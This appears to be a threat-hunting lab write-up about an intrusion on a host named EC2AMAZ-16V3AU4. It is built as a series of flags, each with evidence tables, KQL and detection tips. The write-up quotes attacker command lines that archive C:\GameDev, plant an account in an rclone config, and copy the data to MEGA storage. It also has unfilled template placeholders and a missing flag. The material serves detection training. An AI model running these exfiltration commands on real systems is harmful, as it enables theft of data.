<details>
<summary id="-flag-1">🚩 <strong>Flag 1: <Technique Name></strong></summary>

### 🎯 Objective
Stage and package sensitive data for exfiltration by compressing targeted files into an archive.

### 📌 Finding
The attacker executed a compression command that targeted the `C:\GameDev` directory, indicating this location was used to collect and prepare data prior to exfiltration.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4 |
| Timestamp | 2026-01-30 22:XX:XX UTC |
| Process | 7z.exe (or compression utility observed) |
| Parent Process | cmd.exe |
| Command Line | 7z.exe a archive.zip C:\GameDev |

### 💡 Why it matters
Identifying the source directory (`C:\GameDev`) reveals exactly what data the attacker prioritized for collection and exfiltration, providing direct insight into the scope and sensitivity of the breach. This confirms that intellectual property or development assets were likely targeted, increasing business and operational risk. Understanding where data was staged also helps responders assess impact, contain further loss, and strengthen monitoring around high-value directories commonly abused during data exfiltration.

### 🛠️ Detection Recommendation
Implement detection rules for archive/compression activity involving high-value directories (e.g., source code, shared drives). Alert on command-line usage of tools like 7z, tar, and PowerShell `Compress-Archive`, especially when executed from user or temp directories. Correlate with unusual parent processes and outbound network activity.

**Hunting Tip:**  
Pivot from process creation logs to command-line arguments and look for archive operations targeting sensitive paths. Focus on sequences where data is compressed shortly before network connections or file transfers—this often indicates staging for exfiltration.

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: <Technique Name></strong></summary>

### 🎯 Objective
Exfiltrate collected data from the compromised environment to an external cloud storage provider.

### 📌 Finding
The attacker used the tool `rclone.exe` to transfer data from the local directory `C:\GameDev` to a remote cloud storage service, indicating successful data exfiltration activity.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:07:45.695 UTC |
| Process | rclone.exe |
| Parent Process | Unknown (likely cmd.exe or script execution) |
| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil -v |

### 💡 Why it matters
This confirms that sensitive data from `C:\GameDev` was not only staged but successfully exfiltrated to an external cloud provider, **MEGA**. The use of `rclone` with embedded configuration and destination (`mega:exfil`) indicates the attacker had pre-configured authentication, enabling stealthy and efficient data transfer. This represents a high-impact breach involving potential loss of intellectual property and highlights the risk of cloud-based exfiltration channels bypassing traditional network defenses.

### 🔧 KQL Query Used
EmberForgeX_CL
| where todatetime(UtcTime_s) between (datetime(2026-01-30 21:00:00) .. datetime(2026-01-31 00:00:00))

| project UtcTime_s, Computer, CommandLine_s
| order by todatetime(UtcTime_s) asc

### 🛠️ Detection Recommendation
Monitor and alert on the use of data transfer utilities such as `rclone.exe`, especially when executed from non-standard directories (e.g., `C:\Users\Public`). Implement command-line logging and detection rules for keywords like cloud destinations (e.g., `mega:`, `drive:`, `s3:`) and configuration file usage. Correlate process execution with outbound network activity to cloud storage providers.

**Hunting Tip:**  
Search for command-line patterns that include both a local source path and a remote destination (e.g., `copy C:\... <provider>:`). Focus on tools capable of exfiltration (rclone, curl, powershell) and investigate any activity involving public directories or embedded config files, as these are common attacker staging techniques.

</details>

---

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: <Technique Name></strong></summary>

### 🎯 Objective
Configure the exfiltration tool with authentication credentials to enable data transfer to a remote cloud storage service.

### 📌 Finding
The attacker exposed authentication details in the command line while configuring `rclone`, revealing the email account used to access the cloud storage provider.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:12:36.922 UTC |
| Process | cmd.exe |
| Parent Process | Unknown |
| Command Line | cmd.exe /c "echo user = jwilson.vhr@proton.me>> C:\Users\Public\rclone.conf" |

### 💡 Why it matters
This reveals a critical OPSEC failure by the attacker—credentials were exposed directly in process command-line logs. The email `jwilson.vhr@proton.me` ties the activity to a specific account used for exfiltration, providing a valuable attribution lead. It also demonstrates how sensitive data (credentials) can be inadvertently logged, enabling defenders to detect, investigate, and potentially block unauthorized access to cloud storage services.

### 🔧 KQL Query Used

### 🛠️ Detection Recommendation
Enable and monitor command-line logging (e.g., Sysmon Event ID 1, Windows 4688) and create alerts for credential patterns written to files (e.g., `echo user =`, `password =`) and known exfil tools like `rclone.exe`. Flag executions from non-standard paths (e.g., `C:\Users\Public`) and correlate with file writes to config files (`*.conf`) and subsequent outbound connections to cloud services (e.g., MEGA).

**Hunting Tip:**  
Search for command lines containing `echo` + redirection (`>>`) to config files, especially alongside keywords like `user`, `token`, or `config`. Pivot from these events to nearby `rclone` executions and network activity to confirm credential setup followed by exfiltration.

<summary id="-flag-5">🚩 <strong>Flag 5: <Technique Name></strong></summary>

### 🎯 Objective
Exfiltrate sensitive data from the environment by uploading archived files to an external cloud storage service.

### 📌 Finding
The attacker repeatedly executed `rclone.exe`, a legitimate cloud synchronization tool, to transfer data externally. The command line shows attempts to copy archived data to a remote MEGA storage location, indicating multiple exfiltration attempts.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | EC2AMAZ-16V3AU4.emberforge.local |
| Timestamp | 2026-01-30 23:11:44.379 UTC |
| Process | rclone.exe |
| Parent Process | cmd.exe (likely) |
| Command Line | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\Users\Public\gamedev.zip mega:exfil -v |

### 💡 Why it matters
This confirms active data exfiltration using a trusted, legitimate tool, which makes detection more difficult. The use of `rclone` allows attackers to blend in with normal administrative activity while transferring sensitive data to external cloud storage (MEGA). Multiple execution attempts suggest persistence and determination to successfully extract data, increasing the likelihood of significant data loss.

### 🛠️ Detection Recommendation
Monitor for execution of cloud sync and transfer tools like `rclone.exe`, especially from non-standard directories such as `C:\Users\Public`. Alert on command-line arguments referencing external destinations (e.g., `mega:`, `drive:`) and correlate with file access to sensitive directories and outbound network traffic to cloud storage services.

**Hunting Tip:**  
Search for repeated executions of the same tool within short timeframes, especially with similar command-line patterns. Pivot on `rclone.exe` activity and analyze associated file paths and remote destinations to quickly identify exfiltration behavior.
